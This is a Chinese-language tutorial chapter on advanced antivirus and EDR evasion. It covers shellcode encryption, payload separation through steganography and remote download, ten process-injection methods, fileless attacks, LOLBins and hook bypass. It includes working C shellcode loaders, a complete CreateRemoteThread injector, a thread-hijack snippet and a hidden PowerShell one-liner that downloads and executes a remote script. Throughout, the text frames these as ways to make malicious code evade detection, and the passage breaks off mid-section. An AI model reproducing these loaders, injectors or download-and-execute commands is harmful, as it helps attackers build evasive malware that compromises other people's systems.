---
outline: deep
---

# 第63章 免杀技术（进阶篇）

> **难度等级：🔴 特等级**
>
> **预计学习时间：200分钟**
>
> **本章看点：Shellcode免杀、分离免杀、进程注入（10种方式）、进程掏空、DLL注入、反射型DLL、无文件攻击、APC注入、钩子绕过、免杀加载器、5个实战案例、20道习题**

::: tip 说明
上一章我们学习了基础免杀技术，
包括加壳、花指令、字符串加密、
代码混淆、PE结构等。

这一章我们来学习
更高级的免杀技术——
**Shellcode免杀、进程注入、无文件攻击**。

为什么这些技术更高级？
因为：
1. 基础免杀是改文件，
   高级免杀是改"打法"
2. 基础免杀对付静态扫描，
   高级免杀对付行为检测和内存扫描
3. 无文件攻击根本不落地，
   杀软连文件都找不到

内容包括：
- Shellcode免杀原理与实践
- 分离免杀技术
- 进程注入技术（10种注入方式）
- 进程掏空
- DLL注入与反射型DLL
- 无文件攻击技术
- APC注入
- 钩子检测与绕过
- 免杀加载器开发入门

准备好了吗？
进入进阶免杀的世界！
:::

---

## 💡 核心原理：进阶免杀——从"藏文件"到"藏行为"

> 基础免杀对付静态扫描，进阶免杀对付的是**动态检测和行为分析**。

### 一个比喻区分三层免杀

| 层次 | 核心矛盾 | 类比 |
|------|---------|------|
| **基础免杀** | 文件长得像坏人 → 改长相 | 整容，让警察认不出来 |
| **进阶免杀** | 运行起来行为可疑 → 改行为 | 穿上警服，混在警察队伍里 |
| **高级免杀** | EDR全程监控 → 切断监控 | 收买监控室的保安 |

### 进阶免杀的核心思路：三个人

```
"坏人"代码不应该自己直接跑（太显眼）
而是：
1. 找一个好人（正常进程）→ 进程注入
2. 附着到好人身上（注入Shellcode）→ 鱼目混珠
3. 利用好人的身份做坏事 → 谁干的？看起来是好人干的！
```

**进阶免杀的两大支柱：**
1. **Shellcode免杀**：让"坏代码本身"不被识别
2. **注入技术**：让"坏代码的执行方式"不被怀疑

---

## 63.1 Shellcode免杀原理

### 63.1.1 什么是Shellcode？

Shellcode就是一段
可以直接执行的机器码，
通常是十六进制的形式。

```
示例：一段简单的Shellcode（x86弹出计算器）
\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\xbb\xc7\x93\xc2\x77\xff\xd6
```

**特点：**
- 没有PE结构
- 不依赖文件
- 可以直接注入到内存中执行
- 体积小（通常几百字节到几KB）
- 位置无关（PIC，Position Independent Code）

### 63.1.2 为什么用Shellcode免杀？

1. **没有文件特征** - Shellcode不是PE文件，没有PE头、节区等特征
2. **可以加密编码** - 很容易对Shellcode进行各种加密编码
3. **内存执行** - 直接在内存中执行，不落地
4. **灵活注入** - 可以注入到任意进程中
5. **组合多样** - 可以和各种加载器、注入方式组合

### 63.1.3 Shellcode免杀的核心思路

```
Shellcode免杀 = 加密/编码Shellcode + 自定义加载器

原理：
1. 原始Shellcode → 加密/编码 → 加密后的Shellcode
2. 写一个加载器，负责解密/解码 + 执行
3. 杀软静态扫描时，看到的是加密后的Shellcode，不认识
4. 运行时，加载器解密Shellcode，然后执行
```

**关键在于加载器：**
- 加载器本身要免杀
- 解密方式要独特
- 执行方式要隐蔽
- 尽量模拟正常程序行为

### 63.1.4 Shellcode免杀的发展阶段

```
第1代：直接硬编码Shellcode
  ↓ 很容易被检测
第2代：简单加密（XOR、Base64）
  ↓ 效果一般
第3代：自定义编码 + 花指令
  ↓ 效果不错
第4代：分离免杀 + 多种注入方式
  ↓ 效果很好
第5代：无文件 + 内存加载 + 绕过EDR
  ↓ 效果非常好
第6代：直接系统调用 + Unhooking + AI对抗
  ↓ 顶级免杀
```

---

## 63.2 Shellcode加密/编码

### 63.2.1 XOR加密

最简单的加密方式，
用一个密钥和每个字节异或。

**加密代码：**
```c
void xor_encrypt(unsigned char* data, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}
```

**完整示例：**
```c
#include <windows.h>
#include <stdio.h>

// 原始Shellcode（比如弹出计算器）
unsigned char shellcode[] = {
    0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
    0x54, 0xbb, 0xc7, 0x93, 0xc2, 0x77, 0xff, 0xd6
    // ... 更长的Shellcode
};

int main() {
    // 1. 加密Shellcode（实际使用时预加密，这里演示）
    unsigned char key = 0x41;
    int len = sizeof(shellcode);
    for (int i = 0; i < len; i++) {
        shellcode[i] ^= key;
    }

    // 2. 分配内存
    void* exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 3. 解密Shellcode
    for (int i = 0; i < len; i++) {
        ((unsigned char*)exec_mem)[i] = shellcode[i] ^ key;
    }

    // 4. 执行Shellcode
    ((void(*)())exec_mem)();

    return 0;
}
```

**优点：** 简单、代码少、速度快
**缺点：** 强度低，容易被识别

### 63.2.2 AES加密

更高级的加密方式，
用AES算法加密Shellcode。

```c
// 伪代码示例
#include <windows.h>

// AES加密后的Shellcode
unsigned char encrypted_shellcode[] = { /* ... */ };
unsigned char key[] = "16字节密钥";
unsigned char iv[] = "16字节IV";

int main() {
    int len = sizeof(encrypted_shellcode);

    // 1. 分配内存
    void* exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 2. AES解密
    AES_decrypt(encrypted_shellcode, len, key, iv, exec_mem);

    // 3. 执行
    ((void(*)())exec_mem)();

    return 0;
}
```

**优点：** 强度高
**缺点：** 代码量大，AES库本身可能有特征

### 63.2.3 Base64编码

Base64是编码不是加密，
但也能改变Shellcode的外观。

```c
// Base64编码后的Shellcode
char* b64_shellcode = "MBcAZYNhbGG ... ";

// 运行时Base64解码，然后执行
```

通常和其他加密方式组合使用。

### 63.2.4 自定义编码

效果最好的是
自己设计编码算法，
比如：

**1. 多轮异或**
```c
for (int i = 0; i < len; i++) {
    data[i] ^= key1;
    data[i] ^= key2;
    data[i] += offset;
    data[i] = ~data[i];
}
```

**2. 查表替换**
```c
// 自己做一个替换表
unsigned char table[256] = { /* 256个字节的替换表 */ };

// 编码时：data[i] = table[data[i]]
// 解码时：反过来查
```

**3. 变形编码**
每次生成都不一样，
用随机数、时间等作为密钥的一部分。

### 63.2.5 编码效果对比

| 编码方式 | 难度 | 免杀效果 | 说明 |
|----------|------|----------|------|
| 直接硬编码 | ★☆☆☆☆ | 很差 | 几乎必报 |
| XOR单字节密钥 | ★☆☆☆☆ | 一般 | 容易被识别 |
| XOR多字节密钥 | ★★☆☆☆ | 还可以 | 比单字节好 |
| Base64 | ★☆☆☆☆ | 一般 | 特征明显 |
| AES/DES | ★★★☆☆ | 较好 | 但库本身可能有特征 |
| 自定义算法 | ★★★☆☆ | 好 | 独特，不容易被检测 |
| 多重编码组合 | ★★★★☆ | 很好 | 多种方式叠加 |

::: tip 提示
加密方式不是越复杂越好。
太复杂的加密，
解密代码本身可能就很可疑。

关键是**独特性**——
用别人用得少的方式，
或者自己改造一下，
效果反而更好。
:::

---

## 63.3 分离免杀技术

### 63.3.1 什么是分离免杀？

分离免杀，就是把
Shellcode和加载器分开，
不放在同一个文件里。

```
传统免杀：
┌─────────────────────┐
│   加载器 + Shellcode │  ← 都在一个EXE里
└─────────────────────┘

分离免杀：
┌─────────┐     ┌───────────┐
│ 加载器  │  +  │ Shellcode │  ← 分开放
└─────────┘     └───────────┘
   EXE文件       图片/音频/网络/...
```

Shellcode可以藏在：
- 图片里（图片隐写）
- 音频里（音频隐写）
- 文本文件里
- 网络上（远程下载）
- 注册表里
- 等等...

### 63.3.2 为什么要分离？

1. **加载器更干净** - 加载器里没有Shellcode，静态扫描更安全
2. **Shellcode多变** - Shellcode可以随时换，加载器不用改
3. **隐蔽性强** - Shellcode藏在正常文件里，很难发现
4. **对抗云查杀** - 文件里没有恶意代码，云查杀也查不出来
5. **灵活部署** - Shellcode可以放任何地方

### 63.3.3 图片隐写

把Shellcode藏在图片里。

**方法一：附加在图片末尾**
```
正常图片：
┌─────────────┐
│  图片数据    │
└─────────────┘

藏了Shellcode的图片：
┌─────────────┬──────────────┐
│  图片数据    │  Shellcode   │  ← 附加在末尾
└─────────────┴──────────────┘
```

**加载器：**
```c
// 1. 读取图片文件
// 2. 从图片末尾找到Shellcode的位置
// 3. 读取Shellcode
// 4. 解密
// 5. 执行
```

**方法二：LSB隐写**
把Shellcode的每个比特
藏在图片像素的最低位。

这样图片看起来
和正常图片几乎一样，
用工具才能提取出来。

```
像素的RGB值：
原始：R=100(01100100) G=150(10010110) B=200(11001000)
                    ↓ 最低位藏一个bit
藏了后：R=101(01100101) G=150(10010110) B=201(11001001)
```

### 63.3.4 音频隐写

类似图片隐写，
把Shellcode藏在音频文件里。

可以用LSB隐写，
或者藏在音频的
某个特定位置。

### 63.3.5 网络分离

Shellcode不放在本地，
运行时从网络下载。

```
加载器（本地）
    │
    │  HTTP请求下载Shellcode
    ▼
远程服务器（存放Shellcode）
    │
    │  返回加密的Shellcode
    ▼
加载器解密并执行
```

**变种：**
- 从图片服务器下载一张图片，Shellcode藏在图片里
- 从pastebin之类的网站获取
- 从DNS TXT记录获取
- 等等...

### 63.3.6 其他分离方式

- **注册表分离** - Shellcode存在注册表里
- **ADS流分离** - 藏在NTFS的Alternate Data Stream里
- **进程分离** - Shellcode在另一个进程里，通过通信获取
- **白利用分离** - 藏在正常的系统文件里

::: tip 思路
分离免杀的核心思路是：
**加载器越干净越好，Shellcode藏得越深越好。**

加载器最好看起来像一个
完全正常的程序，
没有任何恶意特征。
Shellcode藏在正常的文件或数据中，
不仔细找根本发现不了。
:::

---

## 63.4 进程注入技术（10种注入方式）

> **最关键的生活类比：借刀杀人**
> 
> 你是一个被通缉的逃犯，你手上有一把刀（Shellcode/恶意代码）。你没法自己拿着刀去街上砍人（会被巡逻警察抓住）。
> 
> 进程注入就是：找一个清白的路人（正常进程，比如notepad.exe），趁他不注意，把刀塞到他手里，操控他的手去砍人。
> 
> 警察来抓人的时候，看到的是这个无辜路人在砍人——但路人自己都不知情！
> 
> **进程注入的本质**：让你的恶意代码在别人的身份下运行。杀软怀疑的也是那个"别人"。

### 63.4.1 什么是进程注入？

进程注入，就是把
我们的代码（Shellcode/DLL）
注入到另一个进程的内存空间里，
让那个进程替我们执行。

```
进程A（我们的程序）
    │
    │  注入Shellcode
    ▼
进程B（正常进程，比如notepad.exe）
    │
    │  执行注入的Shellcode
    ▼
  做我们想做的事
```

**为什么要注入？**
1. **隐蔽** - 恶意代码在正常进程里执行，看起来像正常行为
2. **权限继承** - 注入到高权限进程，获得高权限
3. **绕过监控** - 杀软可能不监控某些正常进程
4. **持久化** - 注入到系统进程，跟着系统启动
5. **免杀** - 注入的代码在内存里，文件里没有

### 63.4.2 10种注入方式总览

```
进程注入方式
│
├── 1. 经典远程线程注入
│   (CreateRemoteThread)
│
├── 2. 进程掏空（Process Hollowing）
│
├── 3. DLL注入
│   (LoadLibrary)
│
├── 4. 反射型DLL注入
│   (Reflective DLL Injection)
│
├── 5. APC注入
│   (QueueUserAPC)
│
├── 6. 线程劫持注入
│   (SetThreadContext)
│
├── 7. 映射注入
│   (MapViewOfSection)
│
├── 8. 原子Bomb注入
│   (AtomBombing)
│
├── 9. 进程空洞变种
│   (Process Doppelgänging / Herpaderping)
│
└── 10. 其他注入方式
    (WMI注入、PowerShell注入、
     注册表注入、SetWindowsHookEx等)
```

### 63.4.3 注入步骤通用流程

大部分注入方式
都遵循类似的步骤：

```
1. 打开目标进程（OpenProcess）
   获取目标进程的句柄

2. 分配内存（VirtualAllocEx）
   在目标进程里分配一块内存

3. 写入Shellcode（WriteProcessMemory）
   把我们的Shellcode写到目标进程的内存里

4. 执行Shellcode（各种方式）
   让目标进程执行Shellcode
   （创建远程线程、APC、劫持线程等）
```

不同的注入方式，
主要区别在第4步——
用什么方法让目标进程执行代码。

---

## 63.5 经典进程注入（CreateRemoteThread）

### 63.5.1 原理

最经典的注入方式，
通过 `CreateRemoteThread`
在目标进程里创建一个远程线程，
线程的入口点就是我们的Shellcode。

```
注入进程            目标进程
   │                    │
   │── OpenProcess ────▶│
   │                    │
   │── VirtualAllocEx ─▶│  分配内存
   │                    │
   │── WriteProcessMemory ─▶│  写入Shellcode
   │                    │
   │── CreateRemoteThread ─▶│  创建远程线程
   │                    │
   │                    │  线程开始执行Shellcode
   │                    │
```

### 63.5.2 完整代码示例

```c
#include <windows.h>
#include <stdio.h>

// Shellcode（这里用弹出计算器的示例）
unsigned char shellcode[] = {
    // ... 你的Shellcode ...
};

int main() {
    // 1. 找到目标进程ID（比如notepad.exe）
    DWORD pid = 1234;  // 假设目标进程PID是1234

    // 2. 打开目标进程
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,  // 所有权限
        FALSE,
        pid
    );
    if (hProcess == NULL) {
        printf("OpenProcess failed: %d\n", GetLastError());
        return 1;
    }

    // 3. 在目标进程中分配内存
    int sc_len = sizeof(shellcode);
    LPVOID remote_mem = VirtualAllocEx(
        hProcess,
        NULL,
        sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // 可执行可读写
    );
    if (remote_mem == NULL) {
        printf("VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // 4. 把Shellcode写入目标进程
    SIZE_T written = 0;
    WriteProcessMemory(
        hProcess,
        remote_mem,
        shellcode,
        sc_len,
        &written
    );

    // 5. 创建远程线程，执行Shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remote_mem,
        NULL,
        0,
        NULL
    );
    if (hThread == NULL) {
        printf("CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 6. 等待线程结束（可选）
    WaitForSingleObject(hThread, INFINITE);

    // 7. 清理
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
```

### 63.5.3 优缺点

**优点：**
- 简单经典，容易实现
- 兼容性好
- 很多工具和教程都用这个

**缺点：**
- 太有名了，杀软重点监控
- CreateRemoteThread这个API很可疑
- PAGE_EXECUTE_READWRITE内存属性也很可疑
- 很容易被EDR检测到

### 63.5.4 绕过检测的思路

1. **替换API** - 不用CreateRemoteThread，用其他方式触发执行
2. **改内存属性** - 先分配可读可写，写完再改成可执行
3. **间接调用** - 不直接调用API，用哈希找地址
4. **直接系统调用** - 不用kernel32的API，直接syscall
5. **选择目标进程** - 注入到正常的系统进程，更隐蔽

这些高级绕过技术
我们后面的章节会讲。

---

## 63.6 进程掏空（Process Hollowing）

> **恐怖类比：夺舍/借尸还魂**
>
> 这可能是最像恐怖片的注入技术。想象一个场景：
> 1. 你创建一个全新的、干干净净的正常进程（比如notepad.exe）
> 2. 像外科手术一样，把这个进程的"内脏"（原始代码）挖掉
> 3. 把你的Shellcode塞进这个空壳子里
> 4. 唤醒这个进程——它看起来还是notepad.exe，但执行的完全是你的恶意代码
>
> **为什么比直接CreateRemoteThread更隐蔽？**
> - `CreateRemoteThread`是在一个活人身上做手术，有风险
> - `Process Hollowing`是先做一个克隆人，然后趁他还"睡着"（暂停状态）替换掉他的大脑。等他醒来时，他已经是你的人了
> - **进程名、路径、图标、属性全都合法**——因为本来就是合法进程，"尸体"是借来的

### 63.6.1 什么是进程掏空？

进程掏空（Process Hollowing），
也叫进程替换、进程镂空。

原理是：
1. 创建一个正常的进程（比如svchost.exe）
2. 把这个进程的内存"掏空"（卸载原来的程序）
3. 把我们的程序（或Shellcode）写进去
4. 恢复执行

这样，
从外面看，
运行的是正常的svchost.exe，
但实际执行的是我们的代码。

```
创建正常进程（比如svchost.exe）
    ↓
挂起进程
    ↓
卸载/替换进程内存中的代码
    ↓
写入我们的代码/Shellcode
    ↓
恢复进程执行
    ↓
看起来像svchost.exe，实际是我们的代码
```

### 63.6.2 为什么要用进程掏空？

1. **隐蔽性强** - 进程名、路径都是正常的
2. **欺骗签名验证** - 进程是微软签名的
3. **绕过某些检测** - 杀软信任系统进程
4. **可以注入完整的PE** - 不只是Shellcode

### 63.6.3 基本步骤

```c
// 简化的步骤说明

// 1. 创建一个挂起的进程
CREATEPROCESS_INFORMATION pi;
CreateProcess(
    "C:\\Windows\\System32\\svchost.exe",
    NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED,  // 挂起创建
    NULL, NULL, &si, &pi
);

// 2. 获取进程镜像基址
// （读取PEB等）

// 3. 卸载原来的内存
// （NtUnmapViewOfSection等）

// 4. 分配内存，写入我们的PE或Shellcode
// （VirtualAllocEx + WriteProcessMemory）

// 5. 设置入口点
// （SetThreadContext或NtSetContextThread）

// 6. 恢复线程执行
ResumeThread(pi.hThread);
```

### 63.6.4 变种技术

进程掏空有很多变种：

- **Process Doppelgänging** - 利用事务型NTFS
- **Process Herpaderping** - 修改文件映射
- **Process Ghosting** - 利用已删除文件的映射
- **等等...**

这些变种都是为了
更隐蔽、更难检测。

### 63.6.5 优缺点

**优点：**
- 隐蔽性强，进程看起来正常
- 能骗过很多检测
- 可以注入完整的PE文件

**缺点：**
- 实现相对复杂
- 某些变种也开始被检测了
- 需要处理PE加载的细节

---

## 63.7 DLL注入技术

### 63.7.1 什么是DLL注入？

DLL注入就是把
一个DLL文件注入到
目标进程中，
让目标进程加载这个DLL，
执行DLL里的代码。

```
注入进程            目标进程
   │                    │
   │── 写入DLL路径 ────▶│
   │                    │
   │── 让目标进程 ─────▶│
   │   LoadLibrary      │  加载DLL
   │                    │  执行DllMain
```

### 63.7.2 经典DLL注入

最经典的DLL注入
用的是CreateRemoteThread + LoadLibrary。

```c
// 1. 在目标进程中分配内存，写入DLL路径
char dll_path[] = "C:\\path\\to\\malicious.dll";
VirtualAllocEx(hProcess, ...);
WriteProcessMemory(hProcess, remote_mem, dll_path, ...);

// 2. 获取LoadLibraryA的地址
// （kernel32.dll在所有进程中地址一样）
FARPROC load_lib = GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");

// 3. 创建远程线程，调用LoadLibrary
CreateRemoteThread(
    hProcess,
    NULL, 0,
    (LPTHREAD_START_ROUTINE)load_lib,
    remote_mem,  // 参数：DLL路径
    0, NULL
);
```

目标进程里的LoadLibrary
会加载我们的DLL，
然后执行DllMain。

### 63.7.3 其他DLL注入方式

除了远程线程，
还有很多DLL注入方式：

**1. 注册表注入（AppInit_DLLs）**
- 修改注册表AppInit_DLLs
- 所有加载user32.dll的进程都会加载这个DLL

**2. 消息钩子注入（SetWindowsHookEx）**
- 设置Windows钩子
- 钩子所在的DLL会被注入到相应进程

**3. 替换DLL（DLL劫持）**
- 把正常的DLL换成我们的
- 程序加载时加载我们的DLL

**4. 并排程序集注入**
- 通过WinSxS程序集注入

**...还有很多**

### 63.7.4 优缺点

**优点：**
- DLL功能强大，可以写复杂的代码
- 比Shellcode更容易写
- 注入方式多

**缺点：**
- 需要一个DLL文件（落地了）
- DLL本身也需要免杀
- LoadLibrary也会被监控

---

## 63.8 反射型DLL注入（Reflective DLL Injection）

### 63.8.1 什么是反射型DLL注入？

普通的DLL注入
需要DLL文件在磁盘上，
然后用LoadLibrary加载。

反射型DLL注入更高级——
DLL完全在内存中加载，
不需要文件落地，
也不用LoadLibrary。

```
普通DLL注入：
  DLL文件（磁盘）
      ↓
  LoadLibrary（系统API）
      ↓
  加载到内存

反射型DLL注入：
  DLL数据（内存中）
      ↓
  自己写的加载器（手动加载）
      ↓
  加载到内存
```

### 63.8.2 原理

反射型DLL注入的核心是
**手动实现一个DLL加载器**，
自己完成：
1. 分配内存
2. 拷贝DLL到内存
3. 处理导入表
4. 处理重定位
5. 调用DllMain

完全自己来，
不用系统的LoadLibrary。

这样做的好处是：
- 不调用LoadLibrary，杀软少一个检测点
- DLL不需要文件落地
- 更隐蔽
- 可以加密DLL，运行时解密

### 63.8.3 关键技术点

**1. 手动加载PE**
- 解析PE头
- 映射各个节区到内存
- 处理重定位表
- 解析导入表，加载依赖的DLL
- 调用TLS回调
- 调用DllMain

**2. 位置无关代码**
反射型加载器本身
需要是位置无关的，
因为是直接注入到内存里的。

**3. 自举过程**
反射型DLL通常有一个
特殊的导出函数（如ReflectiveLoader），
注入后先执行这个函数，
这个函数负责把整个DLL加载起来。

### 63.8.4 优缺点

**优点：**
- 不落地，完全内存加载
- 不调用LoadLibrary，更隐蔽
- 功能强大（完整的DLL）
- 免杀效果好

**缺点：**
- 实现复杂
- 需要处理很多PE细节
- 兼容性问题需要处理

### 63.8.5 知名实现

- **ReflectiveDLLInjection** - 经典的反射型DLL注入实现（Stephen Fewer）
- **Metasploit的Meterpreter** - 用了反射型DLL注入
- **Cobalt Strike的Beacon** - 也用了类似技术

---

## 63.9 无文件攻击技术（Fileless Malware）

### 63.9.1 什么是无文件攻击？

无文件攻击（Fileless Attack），
就是攻击过程中
没有文件写入磁盘。

```
传统攻击：
  恶意文件（磁盘上）
      ↓
  运行
      ↓
  做坏事

无文件攻击：
  （没有恶意文件落地）
      ↓
  直接在内存中执行
  或者利用系统自带工具
      ↓
  做坏事
```

杀软主要是扫描文件的。
如果根本没有文件，
杀软就很难检测了。

### 63.9.2 无文件攻击的层级

```
第0层：有文件落地
  （传统的EXE/DLL木马）

第1层：脚本文件落地
  （PowerShell脚本、VBS、批处理等）

第2层：无文件，但有痕迹
  （注入到系统进程，注册表里有东西）

第3层：纯内存无文件
  （完全在内存中，重启就没了）

第4层：Living-off-the-Land
  （只用系统自带工具，不用自己的代码）

第5层：固件/硬件级
  （BIOS、固件、硬件后门）
```

越往上层，
检测难度越大。

### 63.9.3 常见无文件技术

**1. PowerShell无文件**
- 直接通过命令行执行
- 或者从内存中执行
- 文件不落地

```powershell
# 示例：从内存加载执行
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a'))"
```

**2. WMI无文件**
- 用WMI执行命令
- 可以做到完全无文件

**3. 注册表无文件**
- 把Shellcode存在注册表里
- 用PowerShell或脚本读出来执行
- 虽然有注册表痕迹，但没有文件

**4. 进程注入无文件**
- 注入到系统进程
- 原始注入程序可以删除
- 只有内存中有恶意代码

**5. LOLBins（白利用）**
- 用系统自带的工具做坏事
- 完全不用自己写程序
- 比如：mshta、rundll32、regsvr32、certutil等

### 63.9.4 Living-off-the-Land（白利用）

LOLBins（Living-off-the-Land Binaries），
就是利用系统自带的
正常程序来做坏事。

**常见的LOLBins：**

| 工具 | 说明 | 用途 |
|------|------|------|
| mshta.exe | HTML应用程序主机 | 执行HTA文件、脚本 |
| rundll32.exe | DLL运行工具 | 加载DLL、执行代码 |
| regsvr32.exe | COM组件注册 | 加载DLL、执行代码 |
| certutil.exe | 证书工具 | 下载文件、解码 |
| bitsadmin.exe | 后台传输 | 下载文件 |
| wmic.exe | WMI命令行 | 执行命令 |
| powershell.exe | PowerShell | 执行脚本、下载、注入 |
| cscript/wscript | 脚本宿主 | 执行VBS/JS脚本 |
| msiexec.exe | Windows Installer | 执行MSI包 |
| odbcconf.exe | ODBC配置 | 执行DLL |

还有很多很多...

**核心思路：**
系统工具是微软签名的，
杀软一般信任它们。
用这些工具来执行恶意代码，
就可以绕过很多检测。

### 63.9.5 无文件攻击为什么难检测？

1. **没有文件** - 杀软主要扫文件，没文件怎么扫？
2. **用的是系统工具** - 白名单里的程序，默认信任
3. **只在内存里** - 重启就消失，很难取证
4. **行为和正常操作类似** - 都是正常的API调用
5. **组合多样** - 各种工具组合，防不胜防

---

## 63.10 其他注入方式

### 63.10.1 APC注入

APC（Asynchronous Procedure Call，异步过程调用）注入。

原理：
每个线程都有一个APC队列，
当线程进入可告警状态时，
会执行APC队列里的函数。

我们可以用 `QueueUserAPC`
把我们的函数地址
放到目标线程的APC队列里，
等线程进入可告警状态时，
就会执行我们的代码。

```c
// 伪代码
// 1. 打开目标进程和线程
// 2. 在目标进程分配内存，写入Shellcode
// 3. 枚举目标线程
// 4. 给每个线程排队APC
QueueUserAPC((PAPCFUNC)shellcode_addr, hThread, 0);
// 5. 线程进入可告警状态时，执行Shellcode
```

**特点：**
- 比CreateRemoteThread隐蔽一些
- 需要目标线程进入可告警状态
- 可以一次性给很多线程排队，提高成功率

### 63.10.2 线程劫持注入

线程劫持（Thread Hijacking），
也叫线程上下文注入。

原理：
1. 挂起目标线程
2. 修改线程的上下文（CONTEXT结构）
3. 把指令指针（EIP/RIP）改成Shellcode的地址
4. 恢复线程执行
5. 线程就会从我们的Shellcode开始执行

```c
// 伪代码
// 1. 挂起线程
SuspendThread(hThread);

// 2. 获取线程上下文
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &ctx);

// 3. 修改指令指针，指向Shellcode
ctx.Eip = (DWORD)shellcode_addr;  // x86
// ctx.Rip = shellcode_addr;     // x64

// 4. 设置线程上下文
SetThreadContext(hThread, &ctx);

// 5. 恢复线程
ResumeThread(hThread);
```

### 63.10.3 映射注入

映射注入（Section Mapping），
利用 `NtCreateSection` 和 `NtMapViewOfSection`。

原理：
1. 创建一个Section（内存映射对象）
2. 把Shellcode写到这个Section里
3. 把这个Section映射到目标进程
4. Shellcode就出现在目标进程里了
5. 然后执行

特点：
- 不用WriteProcessMemory
- 用的是Section映射
- 某些杀软可能检测较少

### 63.10.4 AtomBombing注入

AtomBombing（原子炸弹注入），
利用Windows的Atom表。

原理比较复杂，
利用全局Atom表
在进程间传递数据，
然后结合其他机制执行代码。

这是一种比较新的注入技术，
相对来说检测少一些。

### 63.10.5 注入方式对比

| 注入方式 | 难度 | 隐蔽性 | 兼容性 | 推荐指数 |
|----------|------|--------|--------|----------|
| CreateRemoteThread | ★☆☆☆☆ | ★☆☆☆☆ | ★★★★★ | ★★☆☆☆ |
| APC注入 | ★★☆☆☆ | ★★★☆☆ | ★★★☆☆ | ★★★☆☆ |
| 线程劫持 | ★★☆☆☆ | ★★★☆☆ | ★★★☆☆ | ★★★☆☆ |
| 进程掏空 | ★★★☆☆ | ★★★★☆ | ★★★☆☆ | ★★★★☆ |
| DLL注入 | ★★☆☆☆ | ★★☆☆☆ | ★★★★☆ | ★★★☆☆ |
| 反射型DLL | ★★★★☆ | ★★★★☆ | ★★★☆☆ | ★★★★☆ |
| 映射注入 | ★★★☆☆ | ★★★★☆ | ★★★☆☆ | ★★★★☆ |
| AtomBombing | ★★★★☆ | ★★★★☆ | ★★☆☆☆ | ★★★☆☆ |
| Process Doppelgänging | ★★★★★ | ★★★★★ | ★★★☆☆ | ★★★★☆ |

---

## 63.11 钩子检测与绕过

### 63.11.1 什么是钩子（Hook）？

钩子（Hook）就是
"劫持"某个函数，
让函数调用先经过
钩子函数，
钩子函数可以：
- 记录日志
- 检查参数
- 修改行为
- 拦截调用

杀软和EDR经常用钩子
来监控程序的行为。

```
正常调用：
  我们的代码 → kernel32!VirtualAlloc → 内核

被Hook后：
  我们的代码 → EDR的钩子函数 → 检查/记录 → 真正的VirtualAlloc → 内核
```

EDR通常会Hook
很多敏感的API，
比如：
- VirtualAlloc / VirtualProtect
- CreateRemoteThread
- OpenProcess
- WriteProcessMemory
- LoadLibrary
- NtCreateThreadEx
- 等等...

### 63.11.2 怎么检测钩子？

**方法一：检查函数开头**
正常的函数开头
应该是正常的指令。
如果被Hook了，
开头可能是一个跳转指令
（跳到钩子函数）。

```
正常的函数开头：
  48 89 5C 24 08   mov qword ptr [rsp+8], rbx
  ...

被Inline Hook后的函数开头：
  E9 xx xx xx xx   jmp hook_function
  ...
```

**方法二：比较磁盘上的原始代码**
- 读取磁盘上的dll文件
- 和内存中的函数对比
- 不一样说明被Hook了

**方法三：检查IAT表**
IAT（导入地址表）Hook
是修改导入表的地址。
可以检查IAT表中的函数地址
是否在合理的范围内。

### 63.11.3 怎么绕过钩子？

**方法一：直接系统调用（Direct Syscall）**
不通过kernel32/ntdll的API，
直接触发系统调用。
这样就绕过了用户态的Hook。

（下一章会详细讲）

**方法二：Unhooking（取消钩子）**
把被Hook的函数
恢复成原来的样子。

```
方法：
1. 从磁盘上读取原始的dll
2. 找到对应函数的原始代码
3. 把内存中的函数改回去
```

**方法三：间接系统调用（Indirect Syscall）**
从ntdll的某个位置
"借"一条syscall指令，
绕过钩子的检测。

**方法四：手动实现功能**
不用被Hook的API，
自己实现类似的功能，
或者用其他API替代。

**方法五：利用未导出的函数**
用一些不常用的、
没被Hook的函数。

### 63.11.4 为什么Hook检测/绕过很重要？

很多EDR在用户态
Hook了大量API。
如果我们的Shellcode或Payload
调用这些被Hook的API，
很容易就被检测到了。

所以，
高级免杀必须考虑
Hook的检测和绕过。

这也是为什么
直接系统调用、Unhooking
这些技术这么重要。

---

## 63.12 免杀加载器开发入门

### 63.12.1 什么是免杀加载器？

免杀加载器，就是
一个专门用来加载并执行
Shellcode/DLL的程序，
并且这个程序本身
要能绕过杀软检测。

```
免杀加载器
    │
    ├── 获取Shellcode（从哪里来？）
    │   ├─ 硬编码（加密的）
    │   ├─ 文件读取
    │   ├─ 网络下载
    │   ├─ 注册表里读
    │   └─ ...
    │
    ├── 解密/解码Shellcode
    │   ├─ XOR
    │   ├─ AES
    │   ├─ 自定义算法
    │   └─ ...
    │
    ├── 分配内存
    │   ├─ VirtualAlloc
    │   ├─ NtAllocateVirtualMemory
    │   ├─ 堆分配
    │   └─ ...
    │
    ├── 写入Shellcode
    │
    ├── 修改内存属性
    │
    └── 执行Shellcode
        ├─ 直接调用
        ├─ 创建线程
        ├─ APC
        ├─ 回调函数
        ├─ 等等...
```

### 63.12.2 加载器的免杀要点

**1. Shellcode要加密**
- 不能明文存放
- 加密方式要独特
- 最好能动态生成密钥

**2. 避免敏感的API组合**
- VirtualAlloc + memcpy + CreateThread 这个组合太经典了
- 尽量用不那么常见的方式
